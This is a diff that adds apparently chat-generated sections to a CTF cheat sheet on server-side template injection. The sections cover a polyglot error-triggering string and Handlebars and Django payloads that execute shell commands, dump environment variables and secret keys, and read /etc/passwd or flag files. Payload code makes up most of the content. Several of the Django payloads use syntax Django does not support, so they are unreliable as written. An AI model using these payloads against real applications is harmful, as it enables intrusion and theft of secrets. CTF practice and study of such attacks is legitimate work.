@@ -1,3 +1,7 @@
+# All-in-One Error Command
+```
+	${{<%[%'"}}%\
+```
 # ERB - Ruby Template
 SSTI (Server-Side Template Injection) on ERB (Embedded Ruby) is a common vulnerability in Ruby web applications. Here's how you can approach this in a CTF challenge:
 
@@ -569,3 +573,241 @@ ${x}
     - Use object traversal to bypass filters
 
 Remember that in CTF scenarios, flag files may be named differently or located in non-standard directories, so enumeration is essential for success.
+
+# SSTI for HandleBars (JS)
+
+## Basic Detection
+
+First, try to confirm if Handlebars is vulnerable:
+
+```
+{{7*7}}
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return process.env"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
+## Exploiting Prototype Pollution
+
+One approach is to use prototype pollution:
+
+```
+{{#with "constructor" as |c|}}
+  {{#with (lookup c "constructor") as |cc|}}
+    {{#with (lookup cc (lookup cc "name")) as |ccc|}}
+      {{#with "return process.mainModule.require('child_process').execSync('cat /etc/passwd')" as |cmd|}}
+        {{ccc cmd}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
+## Using Helper Functions
+
+If custom helpers are registered, they can sometimes be exploited:
+
+```
+{{#if (helper "/etc/passwd")}}{{/if}}
+```
+
+## Command Execution Payload
+
+For direct command execution:
+
+```
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('id')"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
+## File Read Payload
+
+For reading files:
+
+```
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('fs').readFileSync('/etc/passwd', 'utf8')"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
+## Important Notes
+
+1. Handlebars is generally safer than other template engines like Pug or EJS because it doesn't evaluate JavaScript expressions by default.
+    
+2. Vulnerabilities typically occur when the application:
+    
+    - Uses unsafe practices like `new Function()` with template values
+    - Uses custom helpers that create unsafe contexts
+    - Has prototype pollution vulnerabilities
+    - Uses `handlebars.compile()` with user input
+3. In CTF challenges, look for custom configurations or helper functions that might open security holes.
+    
+
+If you have a specific CTF challenge or scenario you're working on, I'd be happy to provide more targeted assistance.
+
+# SSTI for DJango
+## Django Template Injection
+
+Django uses its own templating engine that's designed to be secure by default, but it can still be vulnerable to Server-Side Template Injection (SSTI) in certain scenarios. Here's a comprehensive guide for exploiting Django template injection vulnerabilities in CTF challenges:
+
+## Detection
+
+Test for basic template injection by trying to evaluate expressions:
+
+```
+{{ 7*7 }}
+{{ request }}
+{% debug %}
+```
+
+## Common Django SSTI Vectors
+
+### 1. Template Variable Access
+
+Django restricts access to many dangerous attributes, but you can traverse objects:
+
+```
+{{ request }}
+{{ request.META }}
+{{ request.environ }}
+{{ settings }}
+```
+
+### 2. Template Tags Exploitation
+
+```
+{% debug %}
+{% if 1 == 1 %}Vulnerable{% endif %}
+```
+
+### 3. Template Filters
+
+```
+{{ "test"|upper }}
+{{ 42|add:7 }}
+```
+
+### 4. Template Loading
+
+If `{% include %}` or `{% extends %}` is used with user input:
+
+```
+{% include "/etc/passwd" %}
+```
+
+## RCE Techniques
+
+Django is designed to prevent direct code execution, but there are bypass techniques:
+
+### Accessing Settings
+
+```
+{{ settings.SECRET_KEY }}
+```
+
+### Accessing OS Module
+
+```
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+```
+
+Find a usable class like `subprocess.Popen` or `os._wrap_close`:
+
+```
+{% with a=request|attr:"__class__"|attr:"__mro__"|last|attr:"__subclasses__" %}
+  {% with b=a()|attr:"pop"|func(177) %}
+    {{ b("whoami")}}
+  {% endwith %}
+{% endwith %}
+```
+
+### Bypassing **builtins** Access
+
+```
+{% with a=''.__class__.__mro__[1].__subclasses__() %}
+  {% with b=a|first|attr:"__subclasses__"|func %}
+    {% with c=b|first|attr:"__init__"|attr:"__globals__"|attr:"__getitem__"|func:"builtins" %}
+      {{ c|attr:"eval"|func:"__import__('os').popen('id').read()" }}
+    {% endwith %}
+  {% endwith %}
+{% endwith %}
+```
+
+## CTF-Specific Exploits
+
+One popular payload pattern for CTF challenges:
+
+```
+{% with a=request|attr:"application"|attr:"__globals__"|attr:"__getitem__"|func:"__builtins__" %}
+  {{ a|attr:"__getitem__"|func:"__import__"|func:"os"|attr:"popen"|func:"cat /flag.txt"|attr:"read"|func }}
+{% endwith %}
+```
+
+For file reading:
+
+```
+{% with a=request|attr:"application"|attr:"__globals__"|attr:"__getitem__"|func:"__builtins__" %}
+  {% with b=a|attr:"__getitem__"|func:"open"|func:"/etc/passwd" %}
+    {{ b|attr:"read"|func }}
+  {% endwith %}
+{% endwith %}
+```
+
+## Security Controls to Look For
+
+1. `django.template.backends.django.DjangoTemplates` with `'APP_DIRS': True`
+2. Custom template contexts or processors
+3. `render()` or `render_to_string()` with user-controlled template names
+4. Custom template tags that might expand capabilities
+5. Debug mode enabled (`settings.DEBUG = True`)
+
+Remember that Django's template engine is designed with security in mind and has more restrictions than other template engines like Jinja2, but these techniques might help you find and exploit vulnerabilities in a CTF context.
